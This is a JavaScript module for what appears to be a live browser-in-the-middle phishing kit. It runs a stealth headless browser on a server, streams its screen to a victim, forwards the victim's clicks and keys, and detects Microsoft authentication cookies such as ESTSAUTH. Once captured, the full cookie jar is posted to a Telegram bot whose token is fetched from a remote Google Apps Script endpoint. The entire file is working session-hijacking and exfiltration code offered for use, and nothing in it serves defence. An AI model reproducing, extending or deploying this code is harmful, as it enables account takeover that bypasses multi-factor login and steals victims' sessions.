const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

// --- CONFIGURATION VAULT ---
const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
let cachedCreds = null;

const VIEWPORT_WIDTH = 1280;
const VIEWPORT_HEIGHT = 720;

async function getSecrets() {
    if (cachedCreds) return cachedCreds;
    try {
        const response = await axios.get(VAULT_URL, { timeout: 5000 });
        cachedCreds = response.data;
        return cachedCreds;
    } catch (e) { return null; }
}

async function sendExfiltrationAlert(cookies, finalUrl, source) {
    const secrets = await getSecrets();
    if (!secrets || !secrets.TG_TOKEN || !secrets.TG_CHAT_ID) return;

    try {
        const host = new URL(finalUrl).hostname;
        const textAlert = `<b>🚨 STAGE CAPTURE: ${host}</b>\n<b>Trigger:</b> ${source}\n<b>Cookies:</b> ${cookies.length}`;
        
        await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendMessage`, { 
            chat_id: secrets.TG_CHAT_ID, 
            text: textAlert, 
            parse_mode: 'HTML' 
        });

        const form = new FormData();
        form.append('chat_id', secrets.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2), 'utf-8'), {
            filename: `JAR_${host.replace(/\./g, '_')}_${Date.now()}.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendDocument`, form, { headers: form.getHeaders() });
    } catch (e) {}
}

async function startSession(io, socket) {
    let browser = null;
    const capturedDomains = new Set(); 

    try {
        // LEAN-MEMORY LAUNCH (Railway Optimized)
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox', 
                '--disable-dev-shm-usage', // FIXES RAILWAY MEMORY REJECTIONS
                '--disable-gpu', 
                '--disable-extensions',
                '--no-zygote',
                '--single-process', // Aggressive RAM saving
                `--window-size=${VIEWPORT_WIDTH},${VIEWPORT_HEIGHT}`
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: VIEWPORT_WIDTH, height: VIEWPORT_HEIGHT });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        const attemptExfiltration = async (source) => {
            try {
                const url = page.url().toLowerCase();
                const host = new URL(url).hostname;
                if (capturedDomains.has(host) || url.includes('about:blank')) return;

                const cookies = await page.cookies();
                const critical = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'CCState', '__Host-MSAAUTH'];
                
                if (cookies.some(c => critical.some(t => c.name.includes(t)))) {
                    capturedDomains.add(host); 
                    await new Promise(r => setTimeout(r, 4500));
                    const finalJar = await page.cookies();
                    await sendExfiltrationAlert(finalJar, url, source);
                }
            } catch (e) {}
        };

        // --- HANDLERS ---
        page.on('response', async (res) => {
            const url = res.url().toLowerCase();
            if (url.includes('/kmsi') || url.includes('/token')) await attemptExfiltration('Net-Intercept');
        });

        const heartbeat = setInterval(async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 15 }); // Reduced quality for bandwidth
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        }, 1300);

        const poller = setInterval(() => attemptExfiltration('Poll'), 5000);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y, { delay: 40 });
                else if (data.type === 'key') await page.keyboard.press(data.key);
            } catch (e) {}
        });

        // THE AGGRESSIVE REAPER
        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(poller);
            if (browser) {
                try {
                    const pages = await browser.pages();
                    await Promise.all(pages.map(p => p.close().catch(() => {})));
                    await browser.close().catch(() => {});
                } finally {
                    browser = null;
                }
            }
        });

    } catch (error) {
        if (browser) await browser.close().catch(() => {});
    }
}

module.exports = { startSession };
